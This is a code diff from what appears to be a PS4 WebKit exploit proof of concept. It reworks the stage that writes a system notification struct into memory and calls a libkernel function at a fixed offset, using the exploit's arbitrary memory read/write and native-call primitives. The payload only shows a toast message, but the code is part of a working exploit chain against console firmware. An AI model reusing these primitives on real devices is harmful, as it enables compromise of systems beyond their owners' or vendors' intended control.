@@ -408,22 +408,36 @@ function layoutNativeCall4(M, G, target, rdi, rsi, rdx, rcx) {
 const NOTIFY_REQ_SIZE = 0xc30;
 const NOTIFY_MSG_OFF = 0x2d;
 const NOTIFY_ICON_OFF = 0x42d;
-const NOTIFY_MSG_MAX = 0x400;
-const NOTIFY_ICON_MAX = 0x800;
+const NOTIFY_MSG_MAX = 1024;
+const NOTIFY_ICON_MAX = 1024;
 const DEFAULT_NOTIFY_MSG = "PS4 WebKit PoC";
 const DEFAULT_NOTIFY_ICON = "cxml://psnotification/tex_icon_system";
 
-/** Al-Azif / OSM SceNotificationRequest — zero all, then set known-good toast fields. */
-function writeNotifyStructAb(ab, message, iconUri) {
+/**
+ * Notification struct layouts from working PS4 code:
+ * - plain: mast1c0re 13.52 + notify.lua + elfldr (targetId=-1, useIcon=0, msg @ 0x2d)
+ * - icon:  OpenOrbis / Al-Azif (useIcon=1 + iconUri @ 0x42d)
+ */
+function writeNotifyPlain(u8, dv, message) {
+    message = message || DEFAULT_NOTIFY_MSG;
+    for (let i = 0; i < NOTIFY_REQ_SIZE; i++) u8[i] = 0;
+    dv.setInt32(0x00, 0, true);
+    dv.setInt32(0x10, -1, true);
+    dv.setInt32(0x28, 0, true);
+    u8[0x2c] = 0;
+    const msgLen = Math.min(message.length, NOTIFY_MSG_MAX - 1);
+    for (let i = 0; i < msgLen; i++)
+        u8[NOTIFY_MSG_OFF + i] = message.charCodeAt(i) & 0xff;
+}
+
+function writeNotifyIcon(u8, dv, message, iconUri) {
     message = message || DEFAULT_NOTIFY_MSG;
     iconUri = iconUri || DEFAULT_NOTIFY_ICON;
-    const u8 = new Uint8Array(ab, 0, NOTIFY_REQ_SIZE);
-    u8.fill(0);
-    const dv = new DataView(ab);
-    dv.setInt32(0x00, 0, true);       // type = Message
-    dv.setInt32(0x10, -1, true);      // targetId = -1 (broadcast)
-    dv.setInt32(0x28, 0, true);       // attribute
-    u8[0x2c] = 1;                     // useIconImageUri (single byte)
+    for (let i = 0; i < NOTIFY_REQ_SIZE; i++) u8[i] = 0;
+    dv.setInt32(0x00, 0, true);
+    dv.setInt32(0x10, -1, true);
+    dv.setInt32(0x28, 0, true);
+    u8[0x2c] = 1;
     const msgLen = Math.min(message.length, NOTIFY_MSG_MAX - 1);
     for (let i = 0; i < msgLen; i++)
         u8[NOTIFY_MSG_OFF + i] = message.charCodeAt(i) & 0xff;
@@ -432,31 +446,62 @@ function writeNotifyStructAb(ab, message, iconUri) {
         u8[NOTIFY_ICON_OFF + j] = iconUri.charCodeAt(j) & 0xff;
 }
 
-function writeNotifyStruct(p, addr, message, iconUri) {
-    message = message || DEFAULT_NOTIFY_MSG;
-    iconUri = iconUri || DEFAULT_NOTIFY_ICON;
+function resolveNotifyFormat(opts) {
+    const q = (opts && opts.format) || (typeof location !== "undefined"
+        ? new URLSearchParams(location.search).get("notifyfmt") : null);
+    if (q === "icon") return "icon";
+    return "plain";
+}
+
+function writeNotifyStructAb(ab, message, iconUri, fmt) {
+    const u8 = new Uint8Array(ab, 0, NOTIFY_REQ_SIZE);
+    const dv = new DataView(ab);
+    if (fmt === "icon") writeNotifyIcon(u8, dv, message, iconUri);
+    else writeNotifyPlain(u8, dv, message);
+}
+
+function writeNotifyStructStack(M, message, iconUri, fmt) {
+    if (fmt === "icon") writeNotifyIcon(M.stackU8, M.stackDv, message, iconUri);
+    else writeNotifyPlain(M.stackU8, M.stackDv, message);
+}
+
+function writeNotifyStruct(p, addr, message, iconUri, fmt) {
+    fmt = fmt || "plain";
     for (let i = 0; i < NOTIFY_REQ_SIZE; i++)
         p.write1(addr.add32(i), 0);
     p.write4(addr, new int64(0, 0));
     p.write4(addr.add32(0x10), new int64(0xffffffff, 0));
     p.write4(addr.add32(0x28), new int64(0, 0));
-    p.write1(addr.add32(0x2c), 1);
+    p.write1(addr.add32(0x2c), fmt === "icon" ? 1 : 0);
+    message = message || DEFAULT_NOTIFY_MSG;
     const msgLen = Math.min(message.length, NOTIFY_MSG_MAX - 1);
     for (let i = 0; i < msgLen; i++)
         p.write1(addr.add32(NOTIFY_MSG_OFF + i), message.charCodeAt(i) & 0xff);
-    const iconLen = Math.min(iconUri.length, NOTIFY_ICON_MAX - 1);
-    for (let j = 0; j < iconLen; j++)
-        p.write1(addr.add32(NOTIFY_ICON_OFF + j), iconUri.charCodeAt(j) & 0xff);
+    if (fmt === "icon") {
+        iconUri = iconUri || DEFAULT_NOTIFY_ICON;
+        const iconLen = Math.min(iconUri.length, NOTIFY_ICON_MAX - 1);
+        for (let j = 0; j < iconLen; j++)
+            p.write1(addr.add32(NOTIFY_ICON_OFF + j), iconUri.charCodeAt(j) & 0xff);
+    }
 }
 
 function peekNotifyMsg(p, addr) {
     let s = "";
-    for (let i = 0; i < 32; i++) {
+    for (let i = 0; i < 48; i++) {
         const c = p.read1(addr.add32(NOTIFY_MSG_OFF + i));
         if (c == null || c === 0) break;
         s += String.fromCharCode(c & 0xff);
     }
     return s;
+}
+
+function peekNotifyTargetId(p, addr) {
+    try {
+        const v = p.read4(addr.add32(0x10));
+        return v != null ? ((v.low >>> 0) | 0) : null;
+    } catch (_) {
+        return null;
+    }
 }
 
 function allocNotifyBuffer(p, addrOff, keepAlive, off) {
@@ -483,33 +528,53 @@ export function stageNotify(p, prep, libkernelBase, off, opts) {
     const fnOff = off.k_notify != null ? off.k_notify : 0x19320;
     const message = opts.message || DEFAULT_NOTIFY_MSG;
     const iconUri = opts.iconUri || DEFAULT_NOTIFY_ICON;
-    const addrOff = prep._bufAddrOff || resolveBufAddrOff(p, off);
-    if (!addrOff)
-        throw new Error("stageNotify: bufAddr chain missing");
-    prep._bufAddrOff = addrOff;
-    if (!prep.keepAlive) prep.keepAlive = [];
-    const nb = allocNotifyBuffer(p, addrOff, prep.keepAlive, off);
-    const buf = nb.native;
-    if (nb.addrOff) prep._bufAddrOff = nb.addrOff;
-    if (nb.ab) {
-        writeNotifyStructAb(nb.ab, message, iconUri);
-        const peek = peekNotifyMsg(p, buf);
-        if (opts.log && peek !== message.slice(0, 32))
-            opts.log("NOTIFY-WARN", "readback msg=\"" + peek + "\" expected=\"" + message.slice(0, 32) + "\"");
-        else if (opts.log)
-            opts.log("NOTIFY-STRUCT", "buf=" + buf + " msg=\"" + peek + "\"");
+    const fmt = resolveNotifyFormat(opts);
+    const useStack = opts.notifyBuf !== "ab";
+    const M = prep.M;
+    let buf;
+
+    if (useStack) {
+        buf = M.K;
+        prep._layout = layoutNativeCall4(
+            M, prep.G, libkernelBase.add32(fnOff),
+            new int64(0, 0),
+            buf,
+            new int64(NOTIFY_REQ_SIZE, 0),
+            new int64(0, 0));
+        writeNotifyStructStack(M, message, iconUri, fmt);
     } else {
-        writeNotifyStruct(p, buf, message, iconUri);
+        const addrOff = prep._bufAddrOff || resolveBufAddrOff(p, off);
+        if (!addrOff)
+            throw new Error("stageNotify: bufAddr chain missing");
+        prep._bufAddrOff = addrOff;
+        if (!prep.keepAlive) prep.keepAlive = [];
+        const nb = allocNotifyBuffer(p, addrOff, prep.keepAlive, off);
+        buf = nb.native;
+        if (nb.addrOff) prep._bufAddrOff = nb.addrOff;
+        prep._layout = layoutNativeCall4(
+            M, prep.G, libkernelBase.add32(fnOff),
+            new int64(0, 0),
+            buf,
+            new int64(NOTIFY_REQ_SIZE, 0),
+            new int64(0, 0));
+        if (nb.ab) writeNotifyStructAb(nb.ab, message, iconUri, fmt);
+        else writeNotifyStruct(p, buf, message, iconUri, fmt);
     }
+
     prep.notifyBuf = buf;
-    prep._layout = layoutNativeCall4(
-        prep.M, prep.G, libkernelBase.add32(fnOff),
-        new int64(0, 0),
-        buf,
-        new int64(NOTIFY_REQ_SIZE, 0),
-        new int64(0, 0));
     prep.staged = true;
     prep.stagedKind = "notify";
+
+    if (opts.log) {
+        const peek = peekNotifyMsg(p, buf);
+        const tid = peekNotifyTargetId(p, buf);
+        const tidOk = tid === -1;
+        opts.log("NOTIFY-FMT", fmt + " " + (useStack ? "stack@K" : "ab")
+            + " buf=" + buf + " targetId=" + tid + (tidOk ? "" : " (want -1)")
+            + " icon=" + (fmt === "icon" ? 1 : 0));
+        opts.log("NOTIFY-STRUCT", "msg=\"" + peek + "\""
+            + (peek === message.slice(0, 48) ? "" : " MISMATCH"));
+    }
 }
 
 export function fireNotify(p, prep, libkernelBase, off, opts) {
